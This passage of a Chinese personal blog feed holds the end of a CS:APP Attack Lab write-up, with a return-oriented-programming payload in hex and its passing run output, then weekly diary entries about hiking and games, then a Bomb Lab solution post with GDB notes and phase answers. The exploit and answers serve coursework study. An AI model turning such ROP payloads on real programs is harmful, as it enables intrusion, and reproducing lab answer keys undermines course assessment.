class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>大功告成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;shell 输入</span><br><span class="line">.&#x2F;hex2raw &lt;in4.txt &gt; out4</span><br><span class="line">.&#x2F;rtarget -i out4 -q</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;shell 输出</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>2020年7月3日~7月8日. 完成了CS:APP 第三个配套实验 Attack Lab.</p><p>这个实验包括了大量的需要自学的内容, 涉及到内存中栈的管理, 函数跳转(retq)的方式, 缓冲区溢出错误, gets()等函数的缺陷等知识点. 了解并尝试了 代码注入攻击, 面向返回编程等代码攻击手段. 了解了 空间布局随机化, 栈禁止执行, 金丝雀区的设置 等代码防御方式.</p><p>提高了自学能力以及对 gdb 等调试工具的使用能力.</p><p>由于本实验最后一小题 RLevel3 本身并没有新知识点 但需要花费大量时间解题, 故暂时略去不做.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是我在2020年7月3日~7月8日完成的Attack Lab的题解与笔记&lt;/p&gt;
&lt;p&gt;攻击实验室是CS:APP 配套实验中的第三个实验, 通过缓冲区溢出和面向返回编程技术实现程序控制. 并学习相关技术, 巩固C运行时状态.&lt;/p&gt;
&lt;p&gt;本文显式地包含答案, 如果你想自己解决,不建议使用本文.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab3-AttackLab&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;对应Github仓库 点我&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="乘龙术" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%98%E9%BE%99%E6%9C%AF/CSAPP/"/>
    
    
      <category term="读书笔记:技术" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E6%8A%80%E6%9C%AF/"/>
    
      <category term="CSAPP" scheme="http://yoursite.com/tags/CSAPP/"/>
    
      <category term="Lab" scheme="http://yoursite.com/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-2</title>
    <link href="http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/"/>
    <id>http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-2/</id>
    <published>2020-07-24T12:25:02.000Z</published>
    <updated>2020-07-31T11:35:36.336Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月6日~2020年7月12日</p><p>徒步: 溧阳-丫髻山</p><a id="more"></a><h2 id="徒步-溧阳-丫髻山"><a href="#徒步-溧阳-丫髻山" class="headerlink" title="徒步: 溧阳-丫髻山"></a>徒步: 溧阳-丫髻山</h2><p>这周日 (7月11-12日) 第一次尝试徒步+爬野山. 以下为流水账记录:</p><p>因为集合的时间是周日大清早, 所以周六就提前去南京了, 找了一家普普通通的青旅安顿下来, 晚上在玄武湖公园逛了一圈 —— 预料之外的大啊哈哈哈, 晚上来这里跑步应该不错, 可惜还是在市中心, 空气不太行. 话说南京的早点包子真难吃啊… 早起去便利店安排了一些物资, 2L 的怡宝+1.5L 的绿茶, 后来证明买这些都是非常必要的.</p><p>领队是个很阳光的大兄弟, 很会唠. 等大巴的时候发现大家都是装备齐全, 背包+登山杖+徒步鞋, 只有我背个小破书包, 蹬了个平底运动鞋来了哈哈哈, 下次一定准备齐全😂. 大巴上领座是位带着两个双胞胎的大叔, 一看就是老户外达人了, 孩子约莫上初中, 一人一个登山杖. 一家人乐乐呵呵地来徒步, 又锻炼体质又促进感情, 真好啊🍋. </p><p>一个钟左右就到溧阳了. 目的地其实是溧阳, 句容交界的两座山头 (最后只爬了一座) . 本来的计划是野道去公路回, 结果前一天一直下雨, 就决定先走公路, 让山路多晒晒太阳. 说起来超级幸运, 本来都已经做好了下雨取消山路的心理准备了, 没想到早上突然晴天. 这也导致我没有带防晒(呜呜呜我以为会是阴天的脑子瓦特了), 带着防身又不多~ 一天走下来直接黑了两个度, 辛苦养半年,一朝回到解放前. </p><p>溧阳的一号彩虹公路, 其实只是中间的双黄道替换成三种不同颜色的标志线, 起初看图片觉得平平无奇, (不就是换个颜色吗有什么新鲜的) 实际上在公路走啊走啊, 看见一条彩虹从脚下延申向远方, 还是有种小确幸滴. 我甚至怀疑倘若自驾走这条路线都没有徒步来的快乐. 一路上和周围人谈笑风生. 有去时正好坐我后排的X, 主动来搭话的杰哥, 另一个小哥shè哥chù Y. 都是独行侠, 甚至都是互联网相关行业的, 只有我一个在校学生. 杰哥是老徒步者了,准备十分充分(连护袖都有准备) 我甚至被杰哥开玩笑”看鞋子就知道是不是新手徒步” (别骂了别骂了我回去就买鞋子😭) 一路上蓝天白云, 上半晌的柏油路还没有升温, 跟着大家东扯西扯: 杰哥今年才从Z大硕士毕业, X 在江宁工作一年, Y本科出来已经工作了五年了. 听他们谈论房租 未来发展, 人生规划. 在想过几年自己是不是也在某个城市漂泊, 在考虑户口, 房价, 股价, 政策发展与行业未来. 同行的还有一个背着女孩的父亲, 小女孩约莫四五岁, 坐在爸爸背后的座位上. 后面上坡下坡都是父亲一直背完了全程, 实在太厉害了!</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%BD%A9%E8%99%B9%E5%85%AC%E8%B7%AF.jpg" alt="彩虹公路"></p><p>终于走过了上半程, 在常州一处小监狱门口稍作休整, 和新伙伴们互相分享了干粮和水—— 这种徒步后的饥饿感让食物瞬间升华, 好吃程度不是拿个方格布带个小竹篮能比拟的2333. 发现拿头巾沾水后带着真的太爽了! 大太阳照着水分汽化吸热, 不经过汗流浃背体会不到凉爽的感觉. 就算在空调房里待一整个夏天也不行. 给大家分享了水, (内心OS: 终于把这个大累赘分出去了! ) 双胞胎在接过水后, 大叔还在一旁督促要说谢谢,  在野外水是非常非常重要的资源云云, 家教极好! 休整之后大家进入了野道, 我也开始记录爬山的路径. </p><p>第一小关是一座摇摇欲坠的小竹桥, 还未见到影子, 就听见前方队友惊呼, 原来竹桥年久失修, 终于在今日不堪重负垮了一半, 半截桥身已然入水. 后面的人只能一个一个走. 扒着相对牢固的扶手. 在最后一个人走过时, 竹桥终于完成了自己一生的使命, 光荣牺牲. 第二天大叔在群里发了我们每个人过桥的照片, 原来他一直在对岸拍摄大家互帮互助过桥的照片, 实在是太惊喜了.</p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%BF%87%E6%A1%A5.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E6%A1%A5.jpg" width = "800" height = "1000" /></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8A.jpg" width="800" height = "1200" /></p><p>接下来一段上坡路, 坡度大约三四十多度, 茂林修竹, 蚊虫四散. 有同行者带了小音箱, 歌声回绕. 过了这一小段竹林后便是稍显难走的林中小径, 不过半米宽度. 由于X是妹子, 体力不佳, 我们逐渐和脱离了大部队, 又等到了另外一位女生Z. 互相帮着背个包搭把手, 爬上了山顶. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%B1%B1%E9%A1%B6.jpg" alt=""></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E5%90%88%E7%85%A7.jpg" alt="合照"></p><p>下山. </p><p>下山的路比我们想的要更加麻烦, 坡度更大, 沙土质地的路也更难走. 只能每次都踩着树根和石块落脚. 有几段路中间没有落脚点, 后一个人就踩着前一个人的脚作为落脚点, 我也才意识到平底鞋真的真的不适合爬山orz, 完全没有抓地力. </p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E4%B8%8B.jpg" width="800" height = "1800" /></p><p><img src="https://my-pic-bed-1302358960.cos.ap-nanjing.myqcloud.com/Blog/202007/%E8%AE%B0%E5%BD%95.jpg" alt=""></p><p>晚上约了快乐火锅</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><h3 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月6日~2020年7月12日&lt;/p&gt;
&lt;p&gt;徒步: 溧阳-丫髻山&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光W-202007-3</title>
    <link href="http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-3/"/>
    <id>http://yoursite.com/2020/07/24/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-3/</id>
    <published>2020-07-24T12:24:42.000Z</published>
    <updated>2020-07-24T13:18:50.671Z</updated>
    
    <content type="html"><![CDATA[<p>2020年7月13日~2020年7月19日</p><p>看番: 瑞克与莫蒂</p><p>回西安</p><a id="more"></a><h2 id="看番-瑞克与莫蒂"><a href="#看番-瑞克与莫蒂" class="headerlink" title="看番: 瑞克与莫蒂"></a>看番: 瑞克与莫蒂</h2><p>久闻大名的神番,终于在我爬山后的腰酸背痛的日子里看完了. 应该是第一次接触美漫 (也是第一次在A站看番) 果然比日漫亚撒西舒爽多了! </p><p>鬼才剧本, 每一集都对时代和社会的痛点进行尽情的诠释——无论是批判还是讽刺, 解构还是歌颂, 常常在一两句话中忽然get到编剧的意图, 然后一拍大腿妈的绝了. </p><p>配音太强了, 听说两个主角的配音都是一个人(这人还同时担任编剧) 我听过很多优秀的日本声优的出演, 能给角色赋予灵魂. 但还是有被这部惊到了: 瑞克与莫蒂的配音好像就是角色自己说出来的一样, 完全符合想象中的二人. </p><p>脑洞比较大. 相对与好莱坞式拿着激光武器突突突的废科幻作品, 本作的幻想程度很对我胃口. 天马行空又大致符合逻辑, 再夹杂着一点点不科学. 比如日了星球, 或者满眼蚂蚁先生. 纯粹的美国式的低俗无聊不遗余力的边角料的屎尿屁想象, 毫无意义,因此让人翱翔.</p><p>美国特色式的永远能在作品中影射现实. 哪怕是真·盒中盒这种老式科幻剧情都能整成奴隶制与博弈论. 多线并行又在结尾交会. 作品甚至能够同时影射资本主义的大部分社会问题 (没错我就是说的S3E7) 信息量最大，隐喻最多，故事最丰富立体，情节最波荡曲折. 没有人比我更懂民族矛盾 —— 其实都是阶级矛盾. </p><p>以及被广大A站网友津津乐道的第四面墙…其实我倒是觉得这个还好, 孤独的看透宇宙荒谬本质的天才科学家, 虽然悲壮却亦不少见. 更打动的则是瑞克认清宇宙的真相, 却依旧热爱生活.</p><p>附录: <a href="https://www.douban.com/group/topic/157799509/" target="_blank" rel="noopener">好看的相关壁纸与插画</a></p><h2 id="收拾东西回长安"><a href="#收拾东西回长安" class="headerlink" title="收拾东西回长安"></a>收拾东西回长安</h2><p>字面意思, 收拾收拾回学校咯</p><p>回去之前还顺便跟两位本地同学吃吃喝喝, 回民街的文文烧烤, 这个酱料真的很特色. 早上在建国路整了碗荤胡辣汤泡馍, 可以, 这很正宗.</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>跟高中同学又起了联系, 逛了一下午, 快乐.</p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><p>none</p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>复习</p><p>英语</p><p>研究宿舍厨艺</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年7月13日~2020年7月19日&lt;/p&gt;
&lt;p&gt;看番: 瑞克与莫蒂&lt;/p&gt;
&lt;p&gt;回西安&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光H_2020上半年</title>
    <link href="http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/"/>
    <id>http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89H-2020%E4%B8%8A%E5%8D%8A%E5%B9%B4/</id>
    <published>2020-07-06T12:57:25.000Z</published>
    <updated>2020-07-06T14:14:24.115Z</updated>
    
    <content type="html"><![CDATA[<p>2020年1月 ~ 6月</p><p>关键词: 疫情, 学习, 健身</p><a id="more"></a><p>第一篇半年记, 一时间竟然有些不知道该些写什么.</p><p>从头说起吧, 纯流水账. </p><p>明天再写吧(咕咕警告)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年1月 ~ 6月&lt;/p&gt;
&lt;p&gt;关键词: 疫情, 学习, 健身&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="半年记" scheme="http://yoursite.com/tags/%E5%8D%8A%E5%B9%B4%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>时与光W_202007-1</title>
    <link href="http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-1/"/>
    <id>http://yoursite.com/2020/07/06/%E6%97%B6%E4%B8%8E%E5%85%89W-202007-1/</id>
    <published>2020-07-06T12:56:41.000Z</published>
    <updated>2020-07-06T13:55:13.051Z</updated>
    
    <content type="html"><![CDATA[<p>2020年6月29日 ~ 7月5日.</p><p>学习CSAPP</p><p>追剧, 游戏, 爬山</p><a id="more"></a><h2 id="学习CSAPP"><a href="#学习CSAPP" class="headerlink" title="学习CSAPP"></a>学习CSAPP</h2><p>完成了Bomb Lab的最后两个炸弹, 并且撰写完成了<a href="[https://luy-hb.xyz/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/](https://luy-hb.xyz/2020/07/01/CSAPP-Lab笔记2-Bomb/">实验报告</a>)</p><p>巩固了上周最后遗留的不太理解的栈溢出攻击等知识点, 开始完成Attack Lab. 目前已完成了前两个小关. </p><p>Attack Lab 是特别针对栈溢出攻击设计的配套实验 <del>虽然我觉得一小节一个实验非常奇怪</del>, 分别要求使用代码注入攻击与ROP(面向返回编程）对代码进行破坏. </p><p>此外还在继续学习有关内存的层次结构等章节, 计划本周内写完有关内存的一篇学习报告.</p><h2 id="追剧-游戏-爬山"><a href="#追剧-游戏-爬山" class="headerlink" title="追剧, 游戏, 爬山"></a>追剧, 游戏, 爬山</h2><h3 id="追剧"><a href="#追剧" class="headerlink" title="追剧"></a>追剧</h3><p>这周将隐蔽的角落看完了, 结局和自己中途推理的基本一致, 也有些许出入. (当然结局本身就是众说纷纭的). 起码早早地看出来朝阳是Boss了不是吗😂</p><p>最佩服自己的是第一集看到张老师一口气一杯水的时候就吐槽 “ 这么能喝怕不是个糖尿病吧 “ , 谁知道居然一语成谶, 不过本身也是瞎猫碰上死耗子了.</p><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>今年Steam夏促真不行…最后一百出头入了 <a href="https://www.xiaoheihe.cn/games/detail/638230" target="_blank" rel="noopener">风之旅人</a> + <a href="https://www.xiaoheihe.cn/games/detail/632360" target="_blank" rel="noopener">雨中冒险2</a> + (被舍友安利的) <a href="https://www.xiaoheihe.cn/games/detail/8870" target="_blank" rel="noopener">生化奇兵:无限</a>. </p><p>当晚打开了散步模拟器风之旅人. 其实作品本身倒是没有特别打动人的地方. 讲述的不过是一次经历千山万水的朝圣之旅, 哪怕洪水滔天,危机四伏, 命丧白土. 画面确实非常优秀, 沙漠的细腻触感比较真实. 部分画面也很适合截图当屏保, 但网上普遍略有过誉.</p><p>一周目偶有遇到几个同行人, 可惜都匆匆离去, 大概是多周目玩家已经没有了荒野中遇到伙伴时的欣喜. 二周目的时候在断桥遇见了一位红袍, 似乎ta也并不是新手, 但是还是很激动地在我身边鸣叫. 于是我第一次遇到真正意义上的同行者. 我们在路上互相充能, 用单调的音节琴瑟和鸣, 在飞龙第一次出现前互相发出短促的提醒, 在雪地里看见ta被挑飞而无能为力, 在暴风雪中里用尽最后一丝力气发出微不可闻的鼓励. 最终在山巅, 在空中, 在瀑布, 在微光中起舞. 丝带在圣光的沾染中螺旋缠绕, 我突然有些庆幸选择开始了二周目, 而不是气呼呼地从硬盘中卸载游戏, 然后在他人问起时说一句: “ 啊画面挺好, 但不值.” </p><p>谢谢你, 一期一会的陌生人. </p><p>当然最后实在是不忍离别23333, 在雪地上磕磕绊绊地一个一个字符地写下自己的联系方式, 最后! 居然! 成功地! 加上了好友, 真是太幸运了~</p><h3 id="爬山"><a href="#爬山" class="headerlink" title="爬山"></a>爬山</h3><p>一开始听说本地到黄山的高铁通车了, 想着周末去玩结果那里下雨. 但是已经勾起我的爬山欲望了23333. 第二天周六就收拾下准备起早去爬隔壁的小山. 临走前想想又把高中同学拽上了! 一天刷了俩座山.</p><p>不过这个小土坡就是没挑战性啦.σ` ∀´)ﾟ∀ﾟ)σ (`ヮ´)</p><p>晚上吃了快乐烤鱼, 好恰.</p><p>结果第二天趴在床上起不来了o(TヘTo)</p><h2 id="其他琐碎事件"><a href="#其他琐碎事件" class="headerlink" title="其他琐碎事件"></a>其他琐碎事件</h2><p>收了好多专业书, 希望能一本本刷完! 加油! </p><h2 id="上周目标完成度"><a href="#上周目标完成度" class="headerlink" title="上周目标完成度"></a>上周目标完成度</h2><ul><li>[x] 继续CSAPP </li><li>[x] 开始刷LC</li><li>[x] 控制每日游戏时长</li></ul><p>都有做到! ✌</p><p>不过 LC 感觉自己还有很多不太清楚, 复杂度大概算是 O(能过) </p><p>好久没有玩平安京了, 有效控制.<del>虽说是把时间花在journey上了</del></p><h2 id="下周目标"><a href="#下周目标" class="headerlink" title="下周目标"></a>下周目标</h2><p>继续CSAPP (要加快速度了! )  </p><p>继续刷 LC</p><p>产出两篇以上的学习笔记(总结不算) </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2020年6月29日 ~ 7月5日.&lt;/p&gt;
&lt;p&gt;学习CSAPP&lt;/p&gt;
&lt;p&gt;追剧, 游戏, 爬山&lt;/p&gt;
    
    </summary>
    
    
      <category term="时与光" scheme="http://yoursite.com/categories/%E6%97%B6%E4%B8%8E%E5%85%89/"/>
    
    
      <category term="小结" scheme="http://yoursite.com/tags/%E5%B0%8F%E7%BB%93/"/>
    
      <category term="周记" scheme="http://yoursite.com/tags/%E5%91%A8%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-Lab笔记2:Bomb</title>
    <link href="http://yoursite.com/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/"/>
    <id>http://yoursite.com/2020/07/01/CSAPP-Lab%E7%AC%94%E8%AE%B02-Bomb/</id>
    <published>2020-07-01T05:58:10.000Z</published>
    <updated>2020-08-01T08:13:39.120Z</updated>
    
    <content type="html"><![CDATA[<p>这是我在2020年6月26日~7月1日完成的Bomb Lab的题解与笔记</p><p>炸弹实验室是CS:APP 配套实验中的第二个实验, 通过对二进制文件反汇编来分析获得拆除炸弹的密码.</p><p>本文显式地包含答案, 如果你想自己解决,不建议使用本文.</p><p><a href="https://github.com/luy-0/CS-APP-LABs/tree/master/Lab-Answer_HB/Lab2-BombLab" target="_blank" rel="noopener">对应Github仓库 点我</a></p><a id="more"></a><h2 id="Catalog"><a href="#Catalog" class="headerlink" title="Catalog"></a>Catalog</h2><ol><li>GDB    包括GDB基本使用法, 但不全面</li><li>Bombs  包括各炸弹的题解与答案</li><li>Functions    包括各函数及其受调用函数的反汇编,及解释</li></ol><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><h3 id="Breakpoints"><a href="#Breakpoints" class="headerlink" title="Breakpoints"></a>Breakpoints</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break sum进入sum()时断点</span><br><span class="line">break *0x80483c3 在地址 0x80483c3 设置断点(注意&#96;\*号)</span><br></pre></td></tr></table></figure><h3 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stepi n执行n条指令,缺省为1 会进入被调用函数</span><br><span class="line">nexti n执行n条指令,缺省为1 不会进入被调用函数</span><br></pre></td></tr></table></figure><h3 id="Print"><a href="#Print" class="headerlink" title="Print"></a>Print</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print (char *) 0xbfff890   Examine a string stored at 0xbffff890</span><br><span class="line"></span><br><span class="line">print  &#x2F;x $rip         十六进制打印rip寄存器 (&#x2F;x可换为&#x2F;d或&#x2F;b)</span><br><span class="line"></span><br><span class="line">print *(int *) 0xbffff890 Print integer at address 0xbffff890</span><br><span class="line"></span><br><span class="line">print *(int **) ($rsp+8)Print address at address  ($rsp+8)</span><br></pre></td></tr></table></figure><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> info registers     Print all registers and their contents </span><br><span class="line"></span><br><span class="line">info breakpoints  Print status of user-settable breakpoints</span><br></pre></td></tr></table></figure><h2 id="Bombs"><a href="#Bombs" class="headerlink" title="Bombs"></a>Bombs</h2><h3 id="Bomb1"><a href="#Bomb1" class="headerlink" title="Bomb1"></a>Bomb1</h3><p>炸弹1涉及到以下函数:</p><ol><li>Phase_1</li><li>strings_not_equal</li><li>string_length</li></ol><p>输入一个字符串, 它将与位于地址<code>0x402400</code>的字符串比较, 相符即可拆除.</p><p>因此答案为:</p><blockquote><p>Border relations with Canada have never been better.</p></blockquote><h3 id="Bomb2"><a href="#Bomb2" class="headerlink" title="Bomb2"></a>Bomb2</h3><p>炸弹2涉及到以下函数:</p><ol><li>Phase_2</li><li>read_six_numbers</li></ol><p>输入6个数字, 第一个是1, 剩下成公比为2的G.P. 即可拆除.</p><p>因此答案为:</p><blockquote><p>1 2 4 8 16 32</p></blockquote><h3 id="Bomb3"><a href="#Bomb3" class="headerlink" title="Bomb3"></a>Bomb3</h3><p>炸弹3涉及到以下函数:</p><ol><li>phase_3</li><li>__isoc99_sscanf</li></ol><p>输入两个数字, 这两个数字必须是以下8组之一:</p><ul><li>0    207</li><li>1    311</li><li>2    707</li><li>3    256</li><li>4    389</li><li>5    206</li><li>6    682</li><li>7    327</li></ul><p>例如,答案可以输入:</p><blockquote><p>2   707</p></blockquote><p>答案不唯一</p><h3 id="Bomb4"><a href="#Bomb4" class="headerlink" title="Bomb4"></a>Bomb4</h3><p>这个递归炸弹真把我整🤮了… 每一条汇编指令都能看懂在干什么, 合在一起就傻了, 连猜带蒙把答案鼓捣出来了…</p><p>我讨厌递归😭</p><p>PS: 后来用反汇编解决了</p><p>炸弹4涉及到以下函数:</p><ol><li>phase_4</li><li>func4</li></ol><p>输入两个数字, 数字1必须为 <code>{0,1,3,7}</code> 中任一个, 数字2必须为 <code>0</code>.</p><p>例如, 答案可以输入:</p><blockquote><p>3  0</p></blockquote><p>答案不唯一</p><h3 id="Bomb-5"><a href="#Bomb-5" class="headerlink" title="Bomb 5"></a>Bomb 5</h3><p>相对不难的映射炸弹, 将输入的字符进行运算映射到特定地址, 并根据这些地址中取出的字符判断是否爆炸.</p><p>炸弹5涉及到以下函数:</p><ol><li>phase_5</li><li>strings_not_equal</li><li>string_length</li></ol><p>输入长度为6的字符串, 每个字符都要符合以下条件:</p><ol><li>第一个字符的ASCII码必须是<code>0x?9</code></li><li>第二个字符的ASCII码必须是<code>0x?f</code></li><li>第三个字符的ASCII码必须是<code>0x?e</code></li><li>第四个字符的ASCII码必须是<code>0x?5</code></li><li>第五个字符的ASCII码必须是<code>0x?6</code></li><li>第六个字符的ASCII码必须是<code>0x?7</code></li></ol><p>其中,<code>?</code>表示任意数字, 例如:</p><ol><li><p><code>?</code>全部取4 . 应输入的字符串为:</p><blockquote><p>IONEFG</p></blockquote></li><li><p><code>?</code>全部取3 . 应输入的字符串为:</p><blockquote><p>9?&gt;567</p></blockquote></li><li><p><code>?</code>也不一定只取同一个值, 例如第12,34,56字符的<code>?</code>值分别取3,4,6. 应输入的字符串为:</p><blockquote><p>9?NEfg</p></blockquote></li></ol><p>上述字符串均可作为答案, 答案不唯一.</p><h3 id="Bomb-6"><a href="#Bomb-6" class="headerlink" title="Bomb 6"></a>Bomb 6</h3><p>比较烦的循环炸弹, 一共涉及到了6个循环(还包括一个嵌套循环) ,一点点捋开就好了.要求输入六个不同数字, 每个数字都必须在1-6之间,并且数字需要按照固定顺序</p><p>炸弹6涉及以下函数:</p><ol><li>phase_6</li><li>read_six_numbers</li></ol><p>输入的每个数字最后都会映射到一个三位数上, 要求被映射顺序必须使由大到小, 因此输入的数字必须按照固定顺序. </p><p>答案:</p><blockquote><p>4,3,2,1,6,5</p></blockquote><h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><h3 id="Main"><a href="#Main" class="headerlink" title="Main()"></a>Main()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span 